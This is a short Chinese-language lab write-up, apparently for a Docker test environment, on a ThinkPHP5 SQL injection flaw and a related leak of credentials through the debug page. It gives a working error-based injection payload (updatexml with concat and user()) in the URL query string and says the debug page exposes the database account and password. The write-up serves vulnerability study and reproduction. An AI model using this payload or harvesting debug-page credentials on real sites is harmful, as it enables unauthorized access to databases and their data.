# ThinkPHP5 SQL注入漏洞 && 敏感信息泄露

运行环境：

```plain
docker compose up -d
```

启动后，访问http://your-ip/index.php?ids[]=1&ids[]=2，即可看到用户名被显示了出来，说明环境运行成功。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922927595-c24dd89d-ba5a-41c6-a34d-2ea4c41052c6.png)

## 漏洞利用

访问http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1，信息成功被爆出：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922927755-460a83b1-fb1e-4ef3-a72a-97fcdf3e0bc7.png)

当然，这是一个比较鸡肋的SQL注入漏洞。但通过DEBUG页面，我们找到了数据库的账号、密码：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780922927890-050c834f-57fa-4770-9466-04c2961ac896.png)

这又属于一个敏感信息泄露漏洞。